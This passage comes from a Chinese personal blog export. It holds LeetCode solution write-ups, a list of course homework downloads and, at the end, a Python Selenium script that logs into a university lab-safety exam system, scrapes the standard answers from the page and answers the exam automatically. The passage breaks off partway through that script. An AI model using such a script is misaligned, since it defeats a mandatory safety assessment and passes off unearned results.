<p><img src="/2020/11/13/%E5%A5%87%E6%95%B0%E5%80%BC%E5%8D%95%E5%85%83%E6%A0%BC%E7%9A%84%E6%95%B0%E7%9B%AE/e2.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：n &#x3D; 2, m &#x3D; 2, indices &#x3D; [[1,1],[0,0]]</span><br><span class="line">输出：0</span><br><span class="line">解释：最后的矩阵是 [[2,2],[2,2]]，里面没有奇数。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 50</code></li>
<li><code>1 &lt;= m &lt;= 50</code></li>
<li><code>1 &lt;= indices.length &lt;= 100</code></li>
<li><code>0 &lt;= indices[i][0] &lt; n</code></li>
<li><code>0 &lt;= indices[i][1] &lt; m</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>直接模拟，遍历数组中的元素，对相应的行和列中的单元格的值加1，最后遍历矩阵，统计奇数值单元格的数目。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败53.87%，内存消耗8.1M，击败10.00%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">oddCells</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> m, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; indices)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//暴力模拟</span></span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//二维vector容器初始化</span></span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">arr</span><span class="params">(n,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;(m,<span class="number">0</span>))</span></span>;</span><br><span class="line">        <span class="keyword">int</span> i,j;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;indices.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;++j)&#123;</span><br><span class="line">                ++arr[indices[i][<span class="number">0</span>]][j];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;n;++j)&#123;</span><br><span class="line">                ++arr[j][indices[i][<span class="number">1</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;m;++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(arr[i][j]%<span class="number">2</span>!=<span class="number">0</span>)&#123;</span><br><span class="line">                    ++result;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，自己的解法效率不是太高，题解中还是有一些好的解法的，比如，统计$n$行$m$列矩阵最后出现变动奇数次行的个数$rowNum$，和奇数次列的个数$colNum$，最后的奇数值单元格的数目计算是：$rowNum<em>m+colNum</em>n-rowNum<em>colNum</em>2$。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>好数对的数目</title>
    <url>/2020/11/06/%E5%A5%BD%E6%95%B0%E5%AF%B9%E7%9A%84%E6%95%B0%E7%9B%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/number-of-good-pairs/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个整数数组 <code>nums</code> 。</p>
<p>如果一组数字 <code>(i,j)</code> 满足 <code>nums[i]</code> == <code>nums[j]</code> 且 <code>i</code> &lt; <code>j</code> ，就可以认为这是一组 <strong>好数对</strong> 。</p>
<p>返回好数对的数目。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,1,1,3]</span><br><span class="line">输出：4</span><br><span class="line">解释：有 4 组好数对，分别是 (0,3), (0,4), (3,4), (2,5) ，下标从 0 开始</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,1,1]</span><br><span class="line">输出：6</span><br><span class="line">解释：数组中的每组数字都是好数对</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3]</span><br><span class="line">输出：0</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 100</code></li>
<li><code>1 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>双for循环遍历</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败48.99%，内存消耗7.5M，击败8.81%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numIdenticalPairs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.size();++i)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;nums.size();++j)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[i]==nums[j])&#123;</span><br><span class="line">                    <span class="comment">//下面这行改成++result;执行用时为0，击败100%，优秀</span></span><br><span class="line">                    result+=<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/number-of-good-pairs/solution/hao-shu-dui-de-shu-mu-by-leetcode-solution/">官方题解：</a></h6><p><strong>方法一：暴力统计</strong><br><strong>思路与算法</strong></p>
<p>对于每个$a_i$,枚举所有的$a_j(j&gt;i)$，检查是否满足$a_i=a_j$，如果是就计入答案。</p>
<p><strong>代码：</strong>（执行0ms，击败100%，内存7.6M，击败5.05%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numIdenticalPairs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.size(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; nums.size(); ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[i] == nums[j]) &#123;</span><br><span class="line">                    ++ans;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n^2)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<p><strong>方法二：组合计数</strong><br><strong>思路与算法</strong></p>
<p>用哈希表统计每个数在序列中出现的次数，假设数字 $k$ 在序列中出现的次数为 $v$，那么满足题目中所说的 $nums[i]=nums[j]=k(i&lt;j)$ 的 $(i,j)$ 的数量就是$\frac{v(v - 1)}{2} $，即$ k$ 这个数值对答案的贡献是 $\frac{v(v - 1)}{2}$ 。我们只需要把所有数值的贡献相加，即可得到答案。</p>
<p><strong>代码</strong>：（执行0ms，击败100%，内存7.6M，击败5.05%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numIdenticalPairs</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span> &lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            ++m[num];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span> &amp;[k, v]: m) &#123;</span><br><span class="line">            ans += v * (v - <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(n)$。</li>
<li>空间复杂度：$O(n)$，即哈希表使用到的辅助空间的空间代价。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>我用的是第一种暴力统计方法，不过变量值加1的写法效率还不同，++ans;要优于ans+=1;😑</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>学业课程资料</title>
    <url>/2020/10/29/%E5%AD%A6%E6%A0%A1%E8%AF%BE%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>《学术道德论文与写作》课程作业，投稿信和催稿信的撰写==》<a href="/common/cover_letter.docx">点我下载文档</a></p>
<p>《自然辩证法》课程作业==》<a href="/common/nature_homework.docx">点我下载文档</a></p>
<p>《工程伦理》课程作业==》<a href="/common/project_homework.docx">点我下载文档</a></p>
<p>《学术英语》课程作业==》<a href="/common/AcademicEnglish.docx">点我下载文档</a></p>
<p>《学术英语》Presentation <a href="https://z2bns.github.io/2020/11/19/AcademicEnglish-presentation/">准备材料</a>， <a href="/common/high AnxietyPhobias.pptx">PPT</a></p>
<p>《数值分析》慕课作业==》<a href="/common/digit_mooc.docx">点我下载文档</a></p>
]]></content>
      <categories>
        <category>课程</category>
      </categories>
  </entry>
  <entry>
    <title>宝石和石头</title>
    <url>/2020/11/07/%E5%AE%9D%E7%9F%B3%E5%92%8C%E7%9F%B3%E5%A4%B4/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/jewels-and-stones/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p> 给定字符串<code>J</code> 代表石头中宝石的类型，和字符串 <code>S</code>代表你拥有的石头。 <code>S</code> 中每个字符代表了一种你拥有的石头的类型，你想知道你拥有的石头中有多少是宝石。</p>
<p><code>J</code> 中的字母不重复，<code>J</code> 和 <code>S</code>中的所有字符都是字母。字母区分大小写，因此<code>&quot;a&quot;</code>和<code>&quot;A&quot;</code>是不同类型的石头。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: J &#x3D; &quot;aA&quot;, S &#x3D; &quot;aAAbbbb&quot;</span><br><span class="line">输出: 3</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: J &#x3D; &quot;z&quot;, S &#x3D; &quot;ZZ&quot;</span><br><span class="line">输出: 0</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ul>
<li><code>S</code> 和 <code>J</code> 最多含有50个字母。</li>
<li><code>J</code> 中的字符不重复。</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历拥有的石头字符串S，对每一个字符如果在宝石字符串J中则数量result加1。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100%，内存消耗6.3M，击败45.80%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(<span class="built_in">string</span> J, <span class="built_in">string</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> result=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;S.length();++i)&#123;</span><br><span class="line">            <span class="comment">//是宝石</span></span><br><span class="line">            <span class="keyword">if</span>(J.find(S[i])!=<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">                ++result;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解："><a href="#官方题解：" class="headerlink" title="官方题解："></a><a href="https://leetcode-cn.com/problems/jewels-and-stones/solution/bao-shi-yu-shi-tou-by-leetcode-solution/">官方题解：</a></h6><h4 id="方法一：暴力"><a href="#方法一：暴力" class="headerlink" title="方法一：暴力"></a>方法一：暴力</h4><p><strong>思路与算法</strong></p>
<p>暴力法的思路很直观，遍历字符串 $S$，对于 $S$ 中的每个字符，遍历一次字符串 $J$，如果其和 $J$ 中的某一个字符相同，则是宝石</p>
<p><strong>代码：</strong>（执行0ms，击败100.00%，内存6.4M，击败21.25%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(<span class="built_in">string</span> J, <span class="built_in">string</span> S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> jewelsCount = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> jewelsLength = J.length(), stonesLength = S.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; stonesLength; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> stone = S[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; jewelsLength; j++) &#123;</span><br><span class="line">                <span class="keyword">char</span> jewel = J[j];</span><br><span class="line">                <span class="keyword">if</span> (stone == jewel) &#123;</span><br><span class="line">                    jewelsCount++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jewelsCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(mn)$，其中 $m$ 是字符串 $J$ 的长度，$n$ 是字符串 $S$ 的长度。遍历字符串 $S$ 的时间复杂度是 $O(n)$，对于 $S$ 中的每个字符，需要遍历字符串 $J$ 判断是否是宝石，时间复杂度是 $O(m)$，因此总时间复杂度是 $O(mn)$。</li>
<li><strong>空间复杂度：</strong>$O(1)$。只需要维护常量的额外空间。</li>
</ul>
<p><strong>方法二：哈希集合</strong><br><strong>思路与算法</strong></p>
<p>方法一中，对于字符串 $S$ 中的每个字符，都需要遍历一次字符串 $J$，导致时间复杂度较高。如果使用哈希集合存储字符串 $J$中的宝石，则可以降低判断的时间复杂度。</p>
<p>遍历字符串$ J$，使用哈希集合存储其中的字符，然后遍历字符串 $S$，对于其中的每个字符，如果其在哈希集合中，则是宝石。</p>
<p><strong>代码：</strong>（执行4ms，击败66.59%，内存6.6M，击败5.26%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numJewelsInStones</span><span class="params">(String J, String S)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> jewelsCount = <span class="number">0</span>;</span><br><span class="line">        Set&lt;Character&gt; jewelsSet = <span class="keyword">new</span> HashSet&lt;Character&gt;();</span><br><span class="line">        <span class="keyword">int</span> jewelsLength = J.length(), stonesLength = S.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; jewelsLength; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> jewel = J.charAt(i);</span><br><span class="line">            jewelsSet.add(jewel);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; stonesLength; i++) &#123;</span><br><span class="line">            <span class="keyword">char</span> stone = S.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (jewelsSet.contains(stone)) &#123;</span><br><span class="line">                jewelsCount++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jewelsCount;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><strong>时间复杂度：</strong>$O(m+n)$，其中 $m$ 是字符串 $J$ 的长度，$n$ 是字符串 $S$ 的长度。遍历字符串 JJ 将其中的字符存储到哈希集合中，时间复杂度是 $O(m)$，然后遍历字符串 $S$，对于 $S$ 中的每个字符在 $O(1)$ 的时间内判断当前字符是否是宝石，时间复杂度是 $O(n)$，因此总时间复杂度是 $O(m+n)$。</li>
<li><strong>空间复杂度：</strong>$O(m)$，其中 $m$ 是字符串 $J$ 的长度。使用哈希集合存储字符串 $J$ 中的字符。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>简单题，暴力还是好用啊，哈哈哈。。。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>实验室安全考试系统自动答题</title>
    <url>/2020/10/26/%E5%AE%9E%E9%AA%8C%E5%AE%A4%E5%AE%89%E5%85%A8%E8%80%83%E8%AF%95%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E7%AD%94%E9%A2%98/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h6 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h6><p>学校要求在实验室安全考试系统上学习实验室安全相关的知识，然后完成一个考试。我就想着借这个机会把python  selenium自动化测试模块的知识再学一下以前只稍微用过那么一两下，反正就是乱搞嘛，学习这么枯燥当然要自己找点乐子了。完成了一个自动答题的一个脚本，输入自己的学号和密码，程序就会自动答题，最后结果应该是满分，仅此记录一下学习过程，不是为了答题才写的，实验室安全还是要好好了解一下的😄，具体代码如下</p>
<a id="more"></a>
<h6 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- codeing = utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2020/10/24</span></span><br><span class="line"><span class="comment"># @Author : loadding...</span></span><br><span class="line"><span class="comment"># @File : lab_safety.py</span></span><br><span class="line"><span class="comment"># @Software : jupyter</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getQuestionBank</span>():</span></span><br><span class="line"><span class="comment">#     url=&quot;http://aqks.neu.edu.cn/redir.php?catalog_id=6&amp;cmd=dajuan_chakan&amp;huihuabh=69338&amp;mode=test&quot;</span></span><br><span class="line">    url=<span class="string">&quot;http://aqks.neu.edu.cn/&quot;</span></span><br><span class="line">    response=requests.get(url)</span><br><span class="line">    page_source=response.text</span><br><span class="line">    <span class="comment">#print(page_source)</span></span><br><span class="line">    tree=etree.HTML(page_source)</span><br><span class="line">    arr=tree.xpath(<span class="string">&#x27;//*[@class=&quot;shiti&quot;]/strong&#x27;</span>)</span><br><span class="line">    <span class="comment">#print(arr)</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_answer</span>(<span class="params">answer_source,question</span>):</span></span><br><span class="line">    <span class="comment">#匹配判断题答案</span></span><br><span class="line">    <span class="comment">#s=question+&#x27;&lt;/strong&gt;（分值1.0）&lt;br/&gt;你未作答标准答案：(.&#123;2,4&#125;?)&lt;/div&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#查了好久，终于知道为什么有的答案搜索不到了，比如某些问题里带有?，而?在正则里是有含义的，需要转义</span></span><br><span class="line">    question=question.replace(<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;\\?&#x27;</span>)</span><br><span class="line">    question=question.replace(<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;\\(&#x27;</span>)</span><br><span class="line">    question=question.replace(<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;\\)&#x27;</span>)</span><br><span class="line">    <span class="comment">#.*?非贪婪模式匹配，匹配判断题、选择题</span></span><br><span class="line">    </span><br><span class="line">    s=question+<span class="string">&#x27;.*?你未作答标准答案：(.&#123;1,2&#125;?)&lt;/div&gt;&#x27;</span></span><br><span class="line">    <span class="comment">#s=&#x27;灾初起阶段是扑救火灾()的阶段。.*?你未作答标准答案：(.&#123;1,2&#125;?)&lt;/div&gt;&#x27;</span></span><br><span class="line">    <span class="comment">#print(s)</span></span><br><span class="line">    pattern=re.compile(s)</span><br><span class="line">    <span class="comment">#获取答案</span></span><br><span class="line">    answer=re.findall(pattern,answer_source)</span><br><span class="line">    <span class="comment">#返回搜索到的答案列表，注意可能为空列表</span></span><br><span class="line">    <span class="comment">#print(answer)</span></span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#登录网站</span></span><br><span class="line">        print(<span class="string">&quot;****************************欢迎来到实验室安全考试系统，本程序是自动答题脚本，祝您玩的愉快！！！*************************&quot;</span>)</span><br><span class="line">        username=input(<span class="string">&#x27;请输入学号：&#x27;</span>)</span><br><span class="line">        password=input(<span class="string">&#x27;请输入密码：&#x27;</span>)</span><br><span class="line">        <span class="comment">#实例化出一个Firefox浏览器</span></span><br><span class="line">        dr=webdriver.Chrome()</span><br><span class="line">        dr.get(<span class="string">&quot;http://aqks.neu.edu.cn/&quot;</span>)</span><br><span class="line">        dr.find_element_by_id(<span class="string">&#x27;u1&#x27;</span>).send_keys(username)</span><br><span class="line">        dr.find_element_by_id(<span class="string">&#x27;password&#x27;</span>).send_keys(password)</span><br><span class="line">        <span class="comment">#点击提交登录</span></span><br><span class="line">        dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;web_login&quot;]/div/form/div[3]/input&#x27;</span>).click()</span><br><span class="line">        <span class="keyword">if</span> dr.current_url==<span class="string">&#x27;http://aqks.neu.edu.cn/&#x27;</span>:</span><br><span class="line">            print(<span class="string">&quot;用户名或密码错误！请重新登录！！！&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#点击导航栏安全考试</span></span><br><span class="line">    dr.find_element_by_xpath(<span class="string">&#x27;/html/body/div[1]/div[2]/ul/li[3]/a&#x27;</span>).click()</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        type=input(<span class="string">&#x27;模拟考试/开始考试（输入1或2）：&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> type==<span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            <span class="comment">#点击模拟考试</span></span><br><span class="line">            dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;article&quot;]/div[4]/div[2]/div/a[1]&#x27;</span>).click()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> type==<span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">            <span class="comment">#点击开始考试</span></span><br><span class="line">            dr.find_element_by_xpath(<span class="string">&#x27;//*[@id=&quot;article&quot;]/div[4]/div[2]/div/a[2]&#x27;</span>).click()</span><br><span class="line">            <span class="keyword">break</span></span><br><span 